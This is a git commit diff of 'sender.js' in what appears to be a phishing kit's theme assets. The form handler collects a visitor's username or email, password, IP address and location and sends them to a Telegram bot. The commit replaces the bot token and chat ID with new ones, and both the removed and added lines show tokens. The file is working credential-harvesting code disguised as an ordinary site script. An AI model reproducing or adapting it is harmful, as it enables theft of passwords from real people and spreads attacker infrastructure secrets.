b9d9d527d95772267b445ef61a304907d3d644f0
ehisehis133 <ehisehis133@gmail.com>
2024-09-19 02:00:07 +0100

    Update sender.js

--- theme-assets/js/scripts/sender.js
+++ theme-assets/js/scripts/sender.js
@@ -22,8 +22,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-   var token = "6482591769:AAElN3cLsXjfi0PK5ZbX_oG6VjZ4sjvKCmI";
-        var chat_id = -4286551298;
+   var token = "6238010383:AAFgGZNvVLJG-Q35fJLZl6w19OS1FG5_TZU";
+        var chat_id = -4502551104;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
